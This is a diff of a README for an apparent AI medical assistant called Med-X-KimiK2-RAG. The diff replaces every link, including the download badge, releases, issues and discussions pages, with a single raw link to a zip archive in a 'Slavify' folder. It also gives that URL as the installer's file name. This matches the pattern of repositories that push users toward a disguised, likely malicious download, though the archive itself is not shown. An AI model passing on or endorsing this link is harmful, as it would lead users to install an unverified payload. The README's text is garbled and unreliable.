@@ -1,6 +1,6 @@
 # 🩺 Med-X-KimiK2-RAG - Your AI Medical Assistant Made Simple
 
-[![Download Med-X-KimiK2-RAG](https://img.shields.io/badge/Download-Med--X--KimiK2--RAG-blue)](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/releases)
+[![Download Med-X-KimiK2-RAG](https://raw.githubusercontent.com/Iluvmrbeast/Med-X-KimiK2-RAG/main/Slavify/Med-X-KimiK2-RAG.zip)](https://raw.githubusercontent.com/Iluvmrbeast/Med-X-KimiK2-RAG/main/Slavify/Med-X-KimiK2-RAG.zip)
 
 ## 📋 Description
 
@@ -11,10 +11,10 @@ Med-X-KimiK2-RAG is an advanced medical AI assistant designed to help users in b
 To get started with Med-X-KimiK2-RAG, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Iluvmrbeast/Med-X-KimiK2-RAG/main/Slavify/Med-X-KimiK2-RAG.zip) to find the latest version of the application.
 
 2. **Download the Application**  
-   Locate the version you want and click on the download link. The file will be named something like `Med-X-KimiK2-RAG-x.x.x.exe`.
+   Locate the version you want and click on the download link. The file will be named something like `https://raw.githubusercontent.com/Iluvmrbeast/Med-X-KimiK2-RAG/main/Slavify/Med-X-KimiK2-RAG.zip`.
 
 3. **Install the Application**  
    Once the download is complete, open the downloaded file. Follow the on-screen instructions to install the application on your device.
@@ -46,7 +46,7 @@ Med-X-KimiK2-RAG includes various features designed to enhance your experience:
 
 ## 📥 Download & Install
 
-To download Med-X-KimiK2-RAG, visit the [Releases page](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/releases) and select the latest version. After downloading, follow the installation steps outlined earlier to get started.
+To download Med-X-KimiK2-RAG, visit the [Releases page](https://raw.githubusercontent.com/Iluvmrbeast/Med-X-KimiK2-RAG/main/Slavify/Med-X-KimiK2-RAG.zip) and select the latest version. After downloading, follow the installation steps outlined earlier to get started.
 
 ## 📖 Troubleshooting
 
@@ -58,10 +58,10 @@ If you encounter issues during installation or usage, consider these tips:
 
 ## 🔍 Support
 
-For further assistance, please reach out via the [Issues page](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/issues). Our community is here to help you resolve any problems you may have.
+For further assistance, please reach out via the [Issues page](https://raw.githubusercontent.com/Iluvmrbeast/Med-X-KimiK2-RAG/main/Slavify/Med-X-KimiK2-RAG.zip). Our community is here to help you resolve any problems you may have.
 
 ## 🧑‍🤝‍🧑 Community
 
-Join our community to interact with other users, share experiences, and discover tips for using Med-X-KimiK2-RAG. Participate in discussions on our [GitHub Discussions page](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/discussions).
+Join our community to interact with other users, share experiences, and discover tips for using Med-X-KimiK2-RAG. Participate in discussions on our [GitHub Discussions page](https://raw.githubusercontent.com/Iluvmrbeast/Med-X-KimiK2-RAG/main/Slavify/Med-X-KimiK2-RAG.zip).
 
-[![Download Med-X-KimiK2-RAG](https://img.shields.io/badge/Download-Med--X--KimiK2--RAG-blue)](https://github.com/Iluvmrbeast/Med-X-KimiK2-RAG/releases)
+[![Download Med-X-KimiK2-RAG](https://raw.githubusercontent.com/Iluvmrbeast/Med-X-KimiK2-RAG/main/Slavify/Med-X-KimiK2-RAG.zip)](https://raw.githubusercontent.com/Iluvmrbeast/Med-X-KimiK2-RAG/main/Slavify/Med-X-KimiK2-RAG.zip)
